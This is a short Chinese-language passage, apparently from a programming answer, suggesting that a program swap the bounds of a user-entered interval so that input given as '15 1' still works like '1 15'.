如果您想进一步改进程序，可以为用户输入的间隔添加相同的交换机制，因此当他输入“15 1”而不是“1 15”时，程序仍然可以正常工作。